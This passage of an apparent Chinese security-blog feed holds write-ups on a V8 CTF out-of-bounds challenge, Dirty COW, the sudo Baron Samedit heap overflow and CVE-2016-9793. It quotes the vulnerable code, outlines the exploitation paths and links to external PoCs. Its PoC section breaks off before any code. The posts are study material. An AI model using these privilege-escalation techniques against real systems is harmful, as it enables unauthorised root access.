title="环境搭建"></a>环境搭建</h3><h3 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h3><h4 id="DebugPrint"><a href="#DebugPrint" class="headerlink" title="%DebugPrint()"></a>%DebugPrint()</h4><p>使用时需要添加启动参数<code>--allow-natives-syntax</code>，可用于打印对象的内存地址、属性、map等。</p><h4 id="SystemBreak"><a href="#SystemBreak" class="headerlink" title="%SystemBreak()"></a>%SystemBreak()</h4><p>即为断点，相当于int 3。</p><h4 id="Print"><a href="#Print" class="headerlink" title="Print()"></a>Print()</h4><p>用于输出变量值。</p><h4 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h4><p>用于输入。</p><h4 id="gdb-v8-support-py"><a href="#gdb-v8-support-py" class="headerlink" title="gdb-v8-support.py"></a>gdb-v8-support.py</h4><p><code>gdb-v8-support.py</code>为v8自带的gdb调试命令，位于/tools/目录下，添加到gdbinit中即可使用。</p><h5 id="job命令"><a href="#job命令" class="headerlink" title="job命令"></a>job命令</h5><p>用于可视化显示JavaScript对象的内存结构。(注意：只能在debug版本中使用，release版本会提示<code>No symbol &quot;_v8_internal_Print_Object&quot; in current context.</code>)</p><h5 id="telescope"><a href="#telescope" class="headerlink" title="telescope"></a>telescope</h5><p>用于查看指定内存地址的数据。</p><h4 id="polyfill"><a href="#polyfill" class="headerlink" title="polyfill"></a>polyfill</h4><p>用于提供开发者们希望浏览器原生提供支持的功能。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2019-ctf-oob"><a href="#2019-ctf-oob" class="headerlink" title="2019 *ctf oob"></a>2019 *ctf oob</h4><p><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-OOB" target="_blank" rel="noopener">下载地址</a></p><h5 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>首先下载源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure><p>回退到相应版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br></pre></td></tr></table></figure><p>接着在v8目录下打上patch：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply /path/oob.diff</span><br></pre></td></tr></table></figure><p>接着进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line"><span class="meta">#</span><span class="bash">debug</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br><span class="line"><span class="meta">#</span><span class="bash">release</span></span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release</span><br></pre></td></tr></table></figure><p>这样就将题目环境搭建好了。</p><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>在分析漏洞前首先要搞懂patch的文件是什么。</p><p>可以明显看到对数组添加了oob方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayOob)&#123;</span><br><span class="line">    uint32_t len = args.length();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">            isolate, receiver, <span class="attr">Object</span>::ToObject(isolate, args.receiver()));</span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;<span class="built_in">Object</span>&gt; value;</span><br><span class="line">        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">                isolate, value, <span class="attr">Object</span>::ToNumber(isolate, args.at&lt;<span class="built_in">Object</span>&gt;(<span class="number">1</span>)));</span><br><span class="line">        elements.set(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当参数个数为1时，返回array[length]处的值的浮点数形式；当参数个数为2时，将参数2以浮点数方式向array[length]处写入。</p><p>很明显，array[length]是数组溢出，而在js中，这个位置存放的是map类型，用于对该数组进行解析。</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210410233738.png" alt="数组地址对应内容"></p><p>其中：</p><ul><li><strong>map</strong>：<strong>定义了如何访问对象</strong></li><li><strong>Prototype</strong>：<strong>对象的原型</strong></li><li><strong>Emelmts地址</strong>：<strong>指向存放元素的地址</strong></li><li><strong>Lengtrh</strong>：<strong>长度</strong></li></ul><p>因此修改map属性使其从整数变为浮点数等即可做到溢出，接着修改地址及长度即可做到任意写，然后结合wasm即可获取flag。具体步骤见参考文章4。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/81f6ded64ab2" target="_blank" rel="noopener">JavaScript V8引擎</a></p><p><a href="https://www.jianshu.com/p/47afd0ac17fd" target="_blank" rel="noopener">认识V8引擎</a></p><p><a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">v8 exploit入门[PlaidCTF roll a d8]</a></p><p><a href="https://www.anquanke.com/post/id/219815" target="_blank" rel="noopener">chrome study by v8 oob</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V8入门记录&quot;&gt;&lt;a href=&quot;#V8入门记录&quot; class=&quot;headerlink&quot; title=&quot;V8入门记录&quot;&gt;&lt;/a&gt;V8入门记录&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="v8" scheme="https://nuoye-blog.github.io/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195(dirtycow)漏洞分析与利用</title>
    <link href="https://nuoye-blog.github.io/2021/03/23/c3b2b583/"/>
    <id>https://nuoye-blog.github.io/2021/03/23/c3b2b583/</id>
    <published>2021-03-23T06:00:00.000Z</published>
    <updated>2021-03-23T05:36:37.957Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2016-5195-dirtycow"><a href="#CVE-2016-5195-dirtycow" class="headerlink" title="CVE-2016-5195(dirtycow)"></a>CVE-2016-5195(dirtycow)</h1><h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h3><p>Linux kernel&gt;2.6.22 (released in 2007)</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在线代码地址：<a href="https://elixir.bootlin.com/linux/v4.4/source/mm/gup.c" target="_blank" rel="noopener">/mm/gup.c</a></p><p>总结来说（偷下懒，具体可以参考链接第三个，或者<a href="https://www.bilibili.com/video/BV1RA411b7fr" target="_blank" rel="noopener">星盟公开课</a>）就是获取页面时，会使用get_user_pages函数来获取。但因为存在cow机制，对不可写页通过mem文件写入时会产生一个不会实际写入文件的副本，且该副本的页表被内核释放时其读写权限不变，再次调页映射回来会是原本文件的页表，这样就造成了对不可写文件的漏洞。</p><h3 id="相应知识"><a href="#相应知识" class="headerlink" title="相应知识"></a>相应知识</h3><h4 id="madvice"><a href="#madvice" class="headerlink" title="madvice"></a>madvice</h4><p>函数定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">madvise</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> advice)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数是用来建议内核对addr～addr+len这部分内存进行何种操作。MADV_DONTNEED代表近期不会访问该内存，内核将释放掉这一内存以节省空间，相应页表项也会被置空。</p><h4 id="mem文件"><a href="#mem文件" class="headerlink" title="mem文件"></a>mem文件</h4><p>/proc/pid/mem这个文件是程序内存的映射，同时当前用户是具有对该文件的读写权限的，因此可以通过对该文件的写入达到对不可写段进行修改的目的，</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://github.com/nuoye-blog/cve/tree/master/CVE-2016-5195(dirtycow)" target="_blank" rel="noopener">传送</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://zhuanlan.zhihu.com/p/25918300" target="_blank" rel="noopener">Linux高危漏洞Dirtycow整理</a></p><p><a href="http://codingdict.com/questions/46297" target="_blank" rel="noopener">对大型页面使用mmap和madvise</a></p><p><a href="https://www.anquanke.com/post/id/84784" target="_blank" rel="noopener">【漏洞分析】CVE-2016-5195 Dirtycow: Linux内核提权漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2016-5195-dirtycow&quot;&gt;&lt;a href=&quot;#CVE-2016-5195-dirtycow&quot; class=&quot;headerlink&quot; title=&quot;CVE-2016-5195(dirtycow)&quot;&gt;&lt;/a&gt;CVE-2016-5195(dirty
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/tags/CVE/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="dirtycow" scheme="https://nuoye-blog.github.io/tags/dirtycow/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156漏洞分析与利用</title>
    <link href="https://nuoye-blog.github.io/2021/03/11/f16ab2a8/"/>
    <id>https://nuoye-blog.github.io/2021/03/11/f16ab2a8/</id>
    <published>2021-03-11T15:00:00.000Z</published>
    <updated>2021-03-11T14:47:24.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-3156漏洞分析与利用"><a href="#CVE-2021-3156漏洞分析与利用" class="headerlink" title="CVE-2021-3156漏洞分析与利用"></a>CVE-2021-3156漏洞分析与利用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个CVE-2021-3156算是真正意义上的第一个洞吧，亲自上手调了下，当然关于参数到底怎么变化的还没有去搞清楚，不过光是理清调试方法以及调用链就花了好久，也积累了好多经验，希望后面复现其他能熟练点吧。</p><h2 id="sudoedit"><a href="#sudoedit" class="headerlink" title="sudoedit"></a>sudoedit</h2><p>sudoedit允许用户安全地编辑文件，命令格式是<code>sudoedit file</code>，该命令首先创建你要编辑的文件的临时副本，然后搜索SUDO_EDITOR，VISUAL和EDITOR环境变量（按此顺序），以确定应调用哪个编辑器来打开刚刚创建的临时副本。 用户完成修改工作后，更改将复制回原始文件。</p><p>另外，sudoedit其实是sudo程序的软链接，但使用sudoedit启动会设置其mode为MODE_EDIT。</p><h3 id="sudo版本"><a href="#sudo版本" class="headerlink" title="sudo版本"></a>sudo版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sudo version 1.8.21p2</span><br><span class="line">Sudoers policy plugin version 1.8.21p2</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I&#x2F;O plugin version 1.8.21p2</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在<code>set_cmnd</code>函数中，当<code>from</code>为<code>\\</code>时，会自增，跳过NULL字符，继续复制envp参数，从而可构造堆溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">  <span class="keyword">while</span> (*from) &#123;</span><br><span class="line">  <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">  *to++ = *from++;</span><br><span class="line">  &#125;</span><br><span class="line">  *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>第一次尝试cve，调试过程中遇到了好多问题。</p><p>第一个是去符号了，这个通过字符串等搜索可以确定基本的main函数和parse_args函数（0x11760）。</p><p>另外在代码中找不到set_cmnd函数的入口，尝试步过确定范围，最终在0x5674处发现程序报错：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210311224322.png" alt="image-20210311203033160"></p><p>进入函数发现调用了/usr/lib/sudo/sudoers.so动态库中的函数，并通过字符串确定是sudoers_policy_check函数地址为0x171A0，sudoers_policy_main函数地址为0x1D8A0，不过set_cmnd内联在sudoers_policy_main函数里了，大概漏洞点在0x1DC68处。</p><p>另外可以通过在gdb中<code>catch exec</code>再<code>c</code>进入sudo程序的调试。</p><h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><p>总的利用过程为：利用堆溢出，修改堆中<code>service_user</code>结构中的动态库名，然后通过<code>nss_load_library</code>函数调用该动态库，最后提权。</p><p>service_user结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br></pre></td></tr></table></figure><p>下面是nss_load_library函数的部分代码，可以看到将libc名称自动补全为<code>&quot;libnss_&quot;+name+&quot;.so&quot;</code>，然后载入内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">nss_load_library (service_user *ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">     ni-&gt;name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">      <span class="string">"libnss_"</span>),</span><br><span class="line">    ni-&gt;name),</span><br><span class="line">  <span class="string">".so"</span>),</span><br><span class="line">__nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure><p>注：在Linux中通过locale来设置程序运行的不同语言环境，<code>LC_ALL=C.UTF-8@</code>即去除所有本地化的设置，其中<code>C</code>是系统默认的locale，<code>UTF-8</code>表示字符集。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/231077#h3-3" target="_blank" rel="noopener">CVE-2021-3156调试分析</a></p><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" target="_blank" rel="noopener">CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)</a></p><p><a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">CVE-2021-3156 PoC</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2021-3156漏洞分析与利用&quot;&gt;&lt;a href=&quot;#CVE-2021-3156漏洞分析与利用&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-3156漏洞分析与利用&quot;&gt;&lt;/a&gt;CVE-2021-3156漏洞分析与利用&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/tags/CVE/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="sudo" scheme="https://nuoye-blog.github.io/tags/sudo/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-9793漏洞分析与利用</title>
    <link href="https://nuoye-blog.github.io/2021/03/11/665d01c6/"/>
    <id>https://nuoye-blog.github.io/2021/03/11/665d01c6/</id>
    <published>2021-03-11T04:00:00.000Z</published>
    <updated>2021-03-11T06:05:51.288Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2016-9793漏洞分析与利用"><a href="#CVE-2016-9793漏洞分析与利用" class="headerlink" title="CVE-2016-9793漏洞分析与利用"></a>CVE-2016-9793漏洞分析与利用</h2><p>原文地址：<a href="https://mp.weixin.qq.com/s/Kq-CcldnbZ6c1Zxfm2FAvw" target="_blank" rel="noopener">传送</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Linux kernel 4.8.13及之前的版本中的net/core/sock.c文件的<code>sock_setsockopt</code>函数存在安全漏洞，该漏洞源于程序没有正确的处理<code>sk_sndbuf</code>和<code>sk_rcvbuf</code>的负值。本地攻击者可利用该漏洞造成拒绝服务（内存损坏和系统崩溃）。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Linux kernel 3.11 -&gt; 4.8</p><h3 id="源码分析（以4-8-13为例）"><a href="#源码分析（以4-8-13为例）" class="headerlink" title="源码分析（以4.8.13为例）"></a>源码分析（以<a href="https://elixir.bootlin.com/linux/v4.8.13/source/net/core/sock.c" target="_blank" rel="noopener">4.8.13</a>为例）</h3><p><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.8.13.tar.xz" target="_blank" rel="noopener">下载地址</a></p><p>sock_setsockopt中关于<code>sk_sndbuf</code>和<code>sk_rcvbuf</code>的处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">set_sndbuf:</span><br><span class="line"><span class="keyword">case</span> SO_SNDBUF:</span><br><span class="line"><span class="comment">/* Don't error on this BSD doesn't and if you think</span></span><br><span class="line"><span class="comment"> * about it this is right. Otherwise apps have to</span></span><br><span class="line"><span class="comment"> * play 'guess the biggest size' games. RCVBUF/SNDBUF</span></span><br><span class="line"><span class="comment"> * are treated in BSD as hints</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">val = <span class="keyword">min_t</span>(u32, val, sysctl_wmem_max);</span><br><span class="line">sk-&gt;sk_userlocks |= SOCK_SNDBUF_LOCK;</span><br><span class="line">sk-&gt;sk_sndbuf = <span class="keyword">max_t</span>(u32, val * <span class="number">2</span>, SOCK_MIN_SNDBUF);</span><br><span class="line"><span class="comment">/* Wake up sending tasks if we upped the value. */</span></span><br><span class="line">sk-&gt;sk_write_space(sk);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">set_rcvbuf:</span><br><span class="line"><span class="keyword">case</span> SO_RCVBUF:</span><br><span class="line"><span class="comment">/* Don't error on this BSD doesn't and if you think</span></span><br><span class="line"><span class="comment"> * about it this is right. Otherwise apps have to</span></span><br><span class="line"><span class="comment"> * play 'guess the biggest size' games. RCVBUF/SNDBUF</span></span><br><span class="line"><span class="comment"> * are treated in BSD as hints</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">val = <span class="keyword">min_t</span>(u32, val, sysctl_rmem_max);</span><br><span class="line">sk-&gt;sk_userlocks |= SOCK_RCVBUF_LOCK;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We double it on the way in to account for</span></span><br><span class="line"><span class="comment"> * "struct sk_buff" etc. overhead.   Applications</span></span><br><span class="line"><span class="comment"> * assume that the SO_RCVBUF setting they make will</span></span><br><span class="line"><span class="comment"> * allow that much actual data to be received on that</span></span><br><span class="line"><span class="comment"> * socket.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Applications are unaware that "struct sk_buff" and</span></span><br><span class="line"><span class="comment"> * other overheads allocate from the receive buffer</span></span><br><span class="line"><span class="comment"> * during socket buffer allocation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * And after considering the possible alternatives,</span></span><br><span class="line"><span class="comment"> * returning the value we actually used in getsockopt</span></span><br><span class="line"><span class="comment"> * is the most desirable behavior.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">sk-&gt;sk_rcvbuf = <span class="keyword">max_t</span>(u32, val * <span class="number">2</span>, SOCK_MIN_RCVBUF);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>max_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max_t(type, x, y) (&#123;\</span></span><br><span class="line">type __max1 = (x);\</span><br><span class="line">type __max2 = (y);\</span><br><span class="line">__max1 &gt; __max2 ? __max1: __max2; &#125;)</span><br></pre></td></tr></table></figure><p>以set_sndbuf为例，<code>max_t(u32, val * 2, SOCK_MIN_SNDBUF)</code>即以<code>u32</code>类型（无符号整数）比较<code>val * 2</code>和<code>SOCK_MIN_SNDBUF</code>的大小，因此会出现-1&gt;100这样的情况，从而导致被攻击。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>PS：需要自行修改偏移。且条件竞争存在一定概率，需多运行几遍才可提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 